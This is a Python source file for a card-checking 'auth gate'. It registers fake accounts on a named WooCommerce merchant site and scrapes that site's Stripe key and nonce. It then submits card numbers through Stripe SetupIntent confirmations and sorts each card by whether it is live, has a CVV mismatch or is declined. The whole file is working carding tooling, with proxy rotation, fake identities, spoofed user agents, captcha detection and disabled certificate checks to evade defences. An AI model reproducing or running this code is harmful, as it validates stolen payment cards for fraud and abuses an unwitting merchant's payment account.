"""
Stripe Real Auth Gate - $0 Authorization via SetupIntent
Uses a merchant site to complete full SetupIntent confirmation flow.
This triggers actual bank authorization without charging.
Enhanced with rate limiting and stealth headers.
"""
import requests
import re
import json
import random
from typing import Tuple
from faker import Faker
from bs4 import BeautifulSoup
import urllib3

from tools.rate_limiter import wait_for_rate_limit, report_rate_limit_hit, report_request_success
from tools.user_agent_pool import generate_profile
from tools.captcha_detector import detect_captcha

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake = Faker()

DOMAIN = "https://www.epicalarc.com"


def stripe_real_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, 
                           proxy=None) -> Tuple[str, bool]:
    """
    Real $0 Auth check via Stripe SetupIntent confirmation.
    
    Flow:
    1. Register user on merchant site
    2. Extract Stripe publishable key and setup nonce
    3. Create PaymentMethod via Stripe API
    4. Confirm SetupIntent via merchant's AJAX endpoint
    
    This triggers actual bank authorization.
    
    Returns: (status_message, proxy_alive)
    """
    site_name = "stripe"
    last4 = card_num[-4:]
    
    session = requests.Session()
    session.verify = False
    timeout = 20
    
    profile = generate_profile(session_id="stripe_auth")
    session.headers.update(profile.get_page_headers())
    
    if proxy:
        if isinstance(proxy, dict):
            session.proxies.update(proxy)
        elif isinstance(proxy, str):
            if ':' in proxy:
                parts = proxy.split(':')
                if len(parts) == 4:
                    proxy_url = f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                else:
                    proxy_url = f'http://{parts[0]}:{parts[1]}'
                session.proxies = {'http': proxy_url, 'https': proxy_url}
    
    yy = card_yer.strip()
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    
    try:
        fname = fake.first_name().lower()
        lname = fake.last_name().lower()
        email = f"{fname}{lname}{random.randint(1000,9999)}@example.com"
        password = fake.password(length=10, special_chars=True)
        
        wait_for_rate_limit("stripe.com")
        res = session.get(f"{DOMAIN}/my-account/", timeout=timeout)
        if res.status_code == 429:
            report_rate_limit_hit("stripe.com", 429)
            return (f"ERROR ⚠️|{site_name}|Rate Limited|{last4}", False)
        if res.status_code == 503:
            report_rate_limit_hit("stripe.com", 503)
            return (f"ERROR ⚠️|{site_name}|Service Unavailable|{last4}", False)
        captcha_result = detect_captcha(res.text)
        if captcha_result.detected and not captcha_result.should_retry:
            return (f"DECLINED ❌|{site_name}|Captcha Detected: {captcha_result.captcha_type}|{last4}", False)
        
        soup = BeautifulSoup(res.text, "html.parser")
        
        nonce_input = soup.find("input", {"name": "woocommerce-register-nonce"})
        referer_input = soup.find("input", {"name": "_wp_http_referer"})
        
        if not nonce_input or not referer_input:
            return (f"DECLINED ❌|{site_name}|Site Unavailable|{last4}", False)
        
        reg_nonce = nonce_input["value"]
        referer = referer_input["value"]
        
        reg_data = {
            "email": email,
            "password": password,
            "register": "Register",
            "woocommerce-register-nonce": reg_nonce,
            "_wp_http_referer": referer,
        }
        
        reg_headers = {
            "origin": DOMAIN,
            "referer": f"{DOMAIN}/my-account/",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": fake.user_agent(),
        }
        
        session.post(f"{DOMAIN}/my-account/", headers=reg_headers, data=reg_data, timeout=timeout)
        
        res = session.get(f"{DOMAIN}/my-account/add-payment-method/", timeout=timeout)
        html = res.text
        
        stripe_pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        
        if not stripe_pk_match or not nonce_match:
            return (f"DECLINED ❌|{site_name}|Failed to Extract Keys|{last4}", False)
        
        stripe_pk = stripe_pk_match.group(0)
        setup_nonce = nonce_match.group(1)
        
        stripe_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": fake.user_agent(),
        }
        
        stripe_data = {
            "type": "card",
            "card[number]": card_num,
            "card[cvc]": card_cvc,
            "card[exp_year]": yy,
            "card[exp_month]": card_mon,
            "billing_details[address][postal_code]": fake.postcode(),
            "billing_details[address][country]": "US",
            "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
            "key": stripe_pk,
            "_stripe_version": "2024-06-20",
        }
        
        pm_response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=stripe_headers,
            data=stripe_data,
            timeout=timeout,
            verify=False
        )
        
        pm_json = pm_response.json()
        pm_id = pm_json.get("id")
        
        if not pm_id:
            error = pm_json.get("error", {})
            error_code = error.get("code", "")
            decline_code = error.get("decline_code", "")
            error_msg = error.get("message", "Unknown error")
            
            if "incorrect_cvc" in error_code or "invalid_cvc" in error_code:
                return (f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{last4}", True)
            elif decline_code == "insufficient_funds":
                return (f"CCN ✅|{site_name}|Insufficient Funds - CVV Match|{last4}", True)
            elif "incorrect_number" in error_code or "invalid_number" in error_code:
                return (f"DECLINED ❌|{site_name}|Invalid Card Number|{last4}", True)
            elif decline_code in ["lost_card", "stolen_card"]:
                return (f"DECLINED ❌|{site_name}|{decline_code.replace('_', ' ').title()}|{last4}", True)
            elif decline_code == "expired_card" or "expired" in error_msg.lower():
                return (f"DECLINED ❌|{site_name}|Expired Card|{last4}", True)
            elif decline_code == "do_not_honor":
                return (f"DECLINED ❌|{site_name}|Do Not Honor|{last4}", True)
            elif decline_code == "fraudulent":
                return (f"DECLINED ❌|{site_name}|Fraudulent|{last4}", True)
            elif decline_code == "generic_decline":
                return (f"DECLINED ❌|{site_name}|Generic Decline|{last4}", True)
            else:
                return (f"DECLINED ❌|{site_name}|{decline_code or error_msg[:30]}|{last4}", True)
        
        confirm_headers = {
            "x-requested-with": "XMLHttpRequest",
            "origin": DOMAIN,
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": fake.user_agent(),
        }
        
        confirm_data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_nonce,
        }
        
        confirm_response = session.post(
            f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=confirm_headers,
            data=confirm_data,
            timeout=timeout
        )
        
        result_text = confirm_response.text
        
        try:
            result_json = json.loads(result_text)
            
            if result_json.get("success") and result_json.get("data", {}).get("status") == "succeeded":
                report_request_success("stripe.com")
                return (f"APPROVED ✅|{site_name}|$0 Auth Passed - Bank Verified|{last4}", True)
            
            elif result_json.get("data", {}).get("status") == "requires_action":
                report_request_success("stripe.com")
                return (f"APPROVED ✅|{site_name}|3DS Required - Auth Passed|{last4}", True)
            
            else:
                error_data = result_json.get("data", {})
                error_obj = error_data.get("error", {})
                error_msg = error_obj.get("message", "")
                decline_code = error_obj.get("decline_code", "")
                error_code = error_obj.get("code", "")
                
                if "insufficient_funds" in str(error_data).lower():
                    return (f"CCN ✅|{site_name}|Insufficient Funds - CVV Match|{last4}", True)
                elif "incorrect_cvc" in str(error_data).lower():
                    return (f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{last4}", True)
                elif decline_code == "do_not_honor":
                    return (f"DECLINED ❌|{site_name}|Do Not Honor|{last4}", True)
                elif decline_code == "fraudulent":
                    return (f"DECLINED ❌|{site_name}|Fraudulent|{last4}", True)
                elif decline_code == "generic_decline":
                    return (f"DECLINED ❌|{site_name}|Generic Decline|{last4}", True)
                elif "expired" in error_msg.lower():
                    return (f"DECLINED ❌|{site_name}|Expired Card|{last4}", True)
                else:
                    return (f"DECLINED ❌|{site_name}|{decline_code or error_msg[:30] or 'Declined'}|{last4}", True)
        
        except json.JSONDecodeError:
            if "incorrect_cvc" in result_text.lower():
                return (f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{last4}", True)
            elif "insufficient" in result_text.lower():
                return (f"CCN ✅|{site_name}|Insufficient Funds - CVV Match|{last4}", True)
            elif "success" in result_text.lower():
                report_request_success("stripe.com")
                return (f"APPROVED ✅|{site_name}|$0 Auth Passed|{last4}", True)
            else:
                return (f"DECLINED ❌|{site_name}|Response Parse Error|{last4}", True)
    
    except requests.exceptions.Timeout:
        return (f"DECLINED ❌|{site_name}|Request Timeout|{last4}", False)
    except requests.exceptions.ProxyError:
        return (f"DECLINED ❌|{site_name}|Proxy Error|{last4}", False)
    except Exception as e:
        return (f"DECLINED ❌|{site_name}|{str(e)[:40]}|{last4}", True)


def health_check() -> bool:
    """Check if the merchant site is accessible"""
    try:
        r = requests.get(f"{DOMAIN}/my-account/", timeout=10, verify=False)
        return r.status_code == 200
    except:
        return False
